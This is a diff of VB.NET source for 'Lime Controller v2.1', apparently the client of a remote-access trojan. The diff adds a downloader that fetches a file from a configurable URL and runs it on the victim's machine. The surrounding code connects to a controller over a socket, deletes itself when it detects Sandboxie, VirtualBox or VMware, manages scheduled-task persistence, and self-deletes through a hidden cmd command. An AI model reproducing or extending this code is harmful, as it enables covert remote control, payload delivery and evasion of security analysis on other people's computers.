@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##           N Y A N   C A T  ||  Last edit FEB/16/2018         ##
+'##           N Y A N   C A T  ||  Last edit FEB/18/2018         ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                  .. Lime Controller v2.0 ..                  ##
+'##                  .. Lime Controller v2.1 ..                  ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -36,7 +36,7 @@ Public Module Core
     Public LPORT As Integer = "%LPORT%"
     Public LID As String = "%LID%"
     Public LKEY As String = "|L|"
-    Public LVER As String = "Controller 2.0"
+    Public LVER As String = "Controller 2.1"
     Public LEXE As String = "%LEXE%"
     Public STUPNAME As String = "%STNAME%"
     Public NMT As Threading.Mutex = Nothing
@@ -50,6 +50,8 @@ Public Module Core
     Public SPUSB_TEXT As String
     Public NEXE As Object = New IO.FileInfo(Reflection.Assembly.GetExecutingAssembly.Location)
     Public fullpath = Interaction.Environ(DRPATH) & "\" & DRFOLDER & "\" & LEXE
+    Public DWURL As String = "%DWURL%"
+    Public DWCHK As Boolean = "%DWCHK%"
     Public WithEvents C As New SocketClient
 
 
@@ -78,21 +80,24 @@ Public Module Core
 
         'check anti
         If ANTIV Then
-            If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
-                DEL()
-            End If
+            Try
+                If Process.GetProcessesByName("SbieSvc").Length >= 1 Then
+                    DEL()
+                End If
 
-            If Process.GetProcessesByName("VBoxservice").Length >= 1 Or IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
-                DEL()
-            End If
+                If Process.GetProcessesByName("VBoxservice").Length >= 1 Or IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
+                    DEL()
+                End If
 
-            If Process.GetProcessesByName("vmwareservice").Length >= 1 Or IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
-                DEL()
-            End If
+                If Process.GetProcessesByName("vmwareservice").Length >= 1 Or IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
+                    DEL()
+                End If
 
-            If ID.GOS.ToString.Contains("XP") Then '99.9% of win xp are AV scan
-                DEL()
-            End If
+                If ID.GOS.ToString.Contains("XP") Then '99.9% of win xp are AV scan
+                    DEL()
+                End If
+            Catch ex As Exception
+            End Try
         End If
 
         'lets drop
@@ -106,9 +111,33 @@ Public Module Core
             SPUSB_TEXT = "Disabled"
         End If
 
-        'final step, let's connect
+        'let's connect
         Dim START_CN As New Threading.Thread(AddressOf C.Connect)
         START_CN.Start()
+
+        'final step, downloader | not EntryPoint.Invoke
+        Try
+            If DWCHK = True Then
+                If IO.File.Exists(IO.Path.GetTempPath + "\lime.dat") Then
+                    'already ran once
+                Else
+                    'didn't run at all or dwchk = false
+                    Dim DW As New Net.WebClient
+                    Dim DWMNAME = IO.Path.GetTempFileName + IO.Path.GetExtension(DWURL)
+                    DW.DownloadFile(DWURL, DWMNAME)
+                    Process.Start(DWMNAME)
+                    IO.File.Create(IO.Path.GetTempPath + "\lime.dat")
+                End If
+            Else
+                Dim DW As New Net.WebClient
+                Dim DWMNAME = IO.Path.GetTempFileName + IO.Path.GetExtension(DWURL)
+                DW.DownloadFile(DWURL, DWMNAME)
+                Process.Start(DWMNAME)
+            End If
+        Catch ex As Exception
+        End Try
+
+
     End Sub
 
     Public Sub Insistence()
@@ -165,6 +194,10 @@ Public Module Core
             Shell("schtasks /Delete /tn " & STUPNAME & " /F", AppWinStyle.Hide, False, -1)
             Threading.Thread.Sleep(50)
         End If
+
+        'del dwchk
+        IO.File.Delete(IO.Path.GetTempPath + "\lime.dat")
+        Threading.Thread.Sleep(50)
 
         'final delete and close connection
         Shell("cmd.exe /c ping 0 -n 2 & del """ & NEXE.FullName & """", AppWinStyle.Hide, False, -1)
